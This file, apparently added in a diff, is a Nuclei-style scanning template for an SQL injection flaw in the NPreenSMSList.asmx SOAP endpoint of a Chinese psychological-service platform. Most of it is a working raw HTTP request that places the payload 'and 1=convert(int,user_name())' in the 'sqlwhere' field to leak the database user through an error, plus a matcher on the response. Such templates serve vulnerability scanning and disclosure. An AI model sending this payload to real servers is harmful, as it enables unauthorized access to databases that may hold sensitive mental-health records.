@@ -1,0 +1,31 @@
+id: rgzhxl-NPreenSMSList-sqli
+info:
+  name: Template Name
+  author: wangzong
+  severity: high
+  description: 瑞格智慧心理服务平台NPreenSMSList.asmx存在sql注入漏洞，允许攻击者通过恶意构造的SQL语句操控数据库，从而导致数据泄露、篡改或破坏，严重威胁系统安全
+  reference:
+    - https://github.com/wy876/POC/blob/main/EDU/%E7%91%9E%E6%A0%BC%E6%99%BA%E6%85%A7%E5%BF%83%E7%90%86%E6%9C%8D%E5%8A%A1%E5%B9%B3%E5%8F%B0NPreenSMSList.asmx%E5%AD%98%E5%9C%A8sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /NPreenManage/NPreenSMSList.asmx HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml; charset=utf-8
+        Content-Length: 374
+        SOAPAction: "RuiGe.WebUi.NPreenSMS/Seach"
+
+        <?xml version="1.0" encoding="utf-8"?>
+        <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
+          <soap:Body>
+            <Seach xmlns="RuiGe.WebUi.NPreenSMS">
+              <sqlwhere>and 1=convert(int,user_name())</sqlwhere>
+            </Seach>
+          </soap:Body>
+        </soap:Envelope>
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'nvarchar'
